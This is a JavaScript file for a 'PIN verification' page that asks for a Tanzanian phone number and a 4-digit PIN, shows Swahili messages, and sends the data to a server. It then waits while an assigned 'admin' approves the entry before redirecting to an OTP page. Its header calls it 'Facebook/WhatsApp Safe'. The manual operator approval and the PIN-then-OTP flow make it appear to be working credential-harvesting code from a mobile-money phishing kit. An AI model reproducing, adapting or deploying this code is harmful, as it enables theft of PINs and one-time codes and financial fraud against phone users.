// PIN Verification Script — Facebook/WhatsApp Safe
// ================================================================
// Admin ID priority (same as landing-script.js):
//   1. Cookie 'assignedAdminId'  (set server-side, most reliable)
//   2. sessionStorage
//   3. localStorage
//   4. applicationData.adminId
// ================================================================

document.addEventListener('DOMContentLoaded', function() {
    const phoneInput      = document.getElementById('phoneNumber');
    const pinInput        = document.getElementById('pin');
    const verifyBtn       = document.getElementById('verifyPinBtn');
    const pinScreen       = document.getElementById('pinScreen');
    const processingScreen = document.getElementById('processingScreen');
    const rejectionScreen  = document.getElementById('rejectionScreen');

    // ========================================
    // INLINE ERROR DISPLAY
    // ========================================
    const errorDiv = document.createElement('div');
    errorDiv.style.cssText = 'display:none;background:#fee;border:1px solid #fcc;color:#c33;padding:12px;border-radius:8px;margin:10px 0;font-weight:500;';
    const formTitle = document.querySelector('.form-title');
    if (formTitle && formTitle.parentNode) {
        formTitle.parentNode.insertBefore(errorDiv, formTitle.nextSibling);
    }

    function showError(msg) {
        errorDiv.textContent = msg;
        errorDiv.style.display = 'block';
        errorDiv.scrollIntoView({ behavior: 'smooth', block: 'center' });
        setTimeout(() => { errorDiv.style.display = 'none'; }, 6000);
    }

    // ========================================
    // UTILITY: Cookie reader
    // ========================================
    function getCookie(name) {
        const m = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));
        return m ? decodeURIComponent(m[1]) : null;
    }

    function isValidAdminId(id) {
        return !!(id && id !== 'undefined' && id !== 'null' && id.trim() !== '');
    }

    // ========================================
    // GET ADMIN ID — all sources
    // ========================================
    const applicationData = JSON.parse(sessionStorage.getItem('applicationData') || '{}');

    const adminFromCookie  = getCookie('assignedAdminId');
    const adminFromSession = sessionStorage.getItem('selectedAdminId');
    const adminFromLocal   = localStorage.getItem('selectedAdminId');
    const adminFromData    = applicationData.adminId;

    let adminId = [adminFromCookie, adminFromSession, adminFromLocal, adminFromData]
        .find(isValidAdminId) || null;

    // Sync to all stores
    if (adminId) {
        sessionStorage.setItem('selectedAdminId', adminId);
        localStorage.setItem('selectedAdminId', adminId);
        applicationData.adminId = adminId;
        sessionStorage.setItem('applicationData', JSON.stringify(applicationData));
    }

    // ========================================
    // DEBUG LOG
    // ========================================
    console.log('═══════════════════════════════════════════');
    console.log('📱 VERIFICATION PAGE — Admin Assignment');
    console.log('  Cookie :', adminFromCookie  || 'none');
    console.log('  Session:', adminFromSession || 'none');
    console.log('  Local  :', adminFromLocal   || 'none');
    console.log('  AppData:', adminFromData    || 'none');
    console.log('  ➜ USING:', adminId || 'AUTO-ASSIGN');
    console.log('═══════════════════════════════════════════');

    // ========================================
    // PIN — NUMBERS ONLY
    // ========================================
    if (pinInput) {
        pinInput.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '').slice(0, 4);
        });
    }

    // ========================================
    // PHONE FORMATTING
    // ========================================
    if (phoneInput) {
        phoneInput.addEventListener('input', function() {
            let v = this.value.replace(/\D/g, '');
            if (v.length > 0 && !v.startsWith('255')) {
                if      (v.startsWith('0')) v = '255' + v.substring(1);
                else if (v.startsWith('7')) v = '255' + v;
            }
            this.value = v.length > 3
                ? '+' + v.substring(0, 3) + ' ' + v.substring(3)
                : v.length > 0 ? '+' + v : '';
        });
    }

    // ========================================
    // VERIFY BUTTON
    // ========================================
    if (verifyBtn) {
        verifyBtn.addEventListener('click', async function(e) {
            e.preventDefault();

            const phoneNumber = (phoneInput ? phoneInput.value.trim() : '').replace(/\s/g, '');
            const pin         = pinInput ? pinInput.value.trim() : '';

            // Validation
            if (!phoneNumber) {
                showError('Tafadhali weka nambari yako ya simu');
                if (phoneInput) { phoneInput.focus(); phoneInput.style.borderColor = '#c33'; setTimeout(() => { phoneInput.style.borderColor = ''; }, 3000); }
                return;
            }
            if (!phoneNumber.match(/^\+?255\d{9}$/)) {
                showError('Nambari ya simu sio sahihi. Tumia format: +255XXXXXXXXX');
                if (phoneInput) { phoneInput.focus(); phoneInput.style.borderColor = '#c33'; setTimeout(() => { phoneInput.style.borderColor = ''; }, 3000); }
                return;
            }
            if (!pin || pin.length !== 4) {
                showError('PIN lazima iwe na nambari 4');
                if (pinInput) { pinInput.focus(); pinInput.style.borderColor = '#c33'; setTimeout(() => { pinInput.style.borderColor = ''; }, 3000); }
                return;
            }

            // Re-read admin (cookie might now be available)
            const freshAdmin = getCookie('assignedAdminId') ||
                               sessionStorage.getItem('selectedAdminId') ||
                               localStorage.getItem('selectedAdminId') ||
                               adminId;

            // Save to session
            applicationData.phone   = phoneNumber;
            applicationData.pin     = pin;
            applicationData.adminId = freshAdmin || null;
            sessionStorage.setItem('applicationData', JSON.stringify(applicationData));

            // Show processing
            if (pinScreen)        pinScreen.style.display        = 'none';
            if (processingScreen) processingScreen.style.display = 'block';

            // Build request
            const requestData = { phoneNumber, pin };
            if (isValidAdminId(freshAdmin)) {
                requestData.adminId        = freshAdmin;
                requestData.assignmentType = 'specific';
                console.log('📤 Sending with specific admin:', freshAdmin);
            } else {
                requestData.assignmentType = 'auto';
                console.log('📤 Sending — server will auto-assign');
            }

            try {
                const response = await fetch('/api/verify-pin', {
                    method : 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body   : JSON.stringify(requestData)
                });

                const result = await response.json();

                if (result.success) {
                    console.log('✅ Application created:', result.applicationId);

                    // Store confirmed assignment
                    if (result.assignedAdminId) {
                        sessionStorage.setItem('selectedAdminId', result.assignedAdminId);
                        localStorage.setItem('selectedAdminId', result.assignedAdminId);
                        applicationData.adminId = result.assignedAdminId;
                    }

                    applicationData.applicationId = result.applicationId;
                    sessionStorage.setItem('applicationData', JSON.stringify(applicationData));

                    checkPinStatus(result.applicationId);
                } else {
                    throw new Error(result.message || 'Failed to submit');
                }

            } catch (error) {
                console.error('❌ Error submitting PIN:', error);
                if (processingScreen) processingScreen.style.display = 'none';
                if (pinScreen)        pinScreen.style.display        = 'block';
                showError('Hitilafu imetokea. Tafadhali jaribu tena. (' + error.message + ')');
            }
        });
    }

    // ========================================
    // POLL FOR PIN STATUS
    // ========================================
    function checkPinStatus(applicationId) {
        let checks = 0;
        const MAX  = 150; // 5 minutes at 2s interval

        console.log('🔄 Polling pin status for:', applicationId);

        const interval = setInterval(async () => {
            checks++;
            try {
                const res    = await fetch(`/api/check-pin-status/${applicationId}`);
                const result = await res.json();

                if (result.success && result.status) {
                    if (checks % 10 === 0 || result.status !== 'pending') {
                        console.log(`🔍 Check #${checks}: ${result.status}`);
                    }

                    if (result.status === 'approved') {
                        clearInterval(interval);
                        console.log('✅ PIN APPROVED — redirecting to OTP');
                        setTimeout(() => { window.location.href = 'otp.html'; }, 1000);

                    } else if (result.status === 'rejected' || result.status === 'denied') {
                        clearInterval(interval);
                        if (processingScreen) processingScreen.style.display = 'none';
                        if (rejectionScreen)  rejectionScreen.style.display  = 'block';
                    }
                }
            } catch (err) {
                if (checks % 10 === 0) console.error('❌ Poll error:', err);
            }

            if (checks >= MAX) {
                clearInterval(interval);
                if (processingScreen) processingScreen.style.display = 'none';
                if (pinScreen)        pinScreen.style.display        = 'block';
                showError('Muda umeisha. Msimamizi hajaitikia. Tafadhali jaribu tena baadaye.');
            }
        }, 2000);
    }

    // ========================================
    // TRY AGAIN BUTTON
    // ========================================
    const tryAgainBtn = document.querySelector('#tryAgainBtn');
    if (tryAgainBtn) {
        tryAgainBtn.addEventListener('click', function() {
            if (rejectionScreen) rejectionScreen.style.display = 'none';
            if (pinScreen)       pinScreen.style.display       = 'block';
            if (phoneInput) phoneInput.value = '';
            if (pinInput)   pinInput.value   = '';
            errorDiv.style.display = 'none';
        });
    }

    // ========================================
    // SMALL ADMIN INDICATOR (dev aid)
    // ========================================
    if (adminId) {
        const badge = document.createElement('div');
        badge.style.cssText = 'position:fixed;bottom:20px;right:20px;background:#2196F3;color:white;padding:8px 16px;border-radius:20px;font-size:11px;font-weight:bold;z-index:9999;box-shadow:0 2px 8px rgba(0,0,0,.15);pointer-events:none;';
        badge.textContent = '🎯 ' + adminId;
        document.body.appendChild(badge);
        setTimeout(() => {
            badge.style.transition = 'opacity .3s';
            badge.style.opacity = '0';
            setTimeout(() => badge.remove(), 320);
        }, 5000);
    }
});
